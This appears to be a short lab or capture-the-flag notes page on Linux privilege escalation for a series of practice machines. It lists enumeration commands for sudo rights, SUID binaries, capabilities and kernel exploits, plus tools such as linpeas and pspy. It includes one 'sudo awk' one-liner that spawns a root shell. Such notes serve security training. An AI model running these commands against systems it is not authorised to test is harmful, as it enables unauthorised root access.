## 🛡️ Privilege Escalation (Machines 141–150)

```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check Linux capabilities
getcap -r / 2>/dev/null

# Check kernel version
uname -a

# Search for known exploits
searchsploit linux kernel <version>

# Example Sudo Abuse
sudo awk 'BEGIN {system("/bin/sh")}'
```

### Common Techniques Observed

- Misconfigured sudo permissions allowing execution of privileged binaries.
- Exploitable SUID binaries like `vim`, `nmap`, or custom scripts.
- Weak permissions on configuration or cron files.
- Exploitable capabilities like `cap_setuid` on binaries.

### Tools Used

- `linpeas.sh`
- `pspy`
- `sudo -l`
- `find`, `getcap`, `ls -la /home/*/`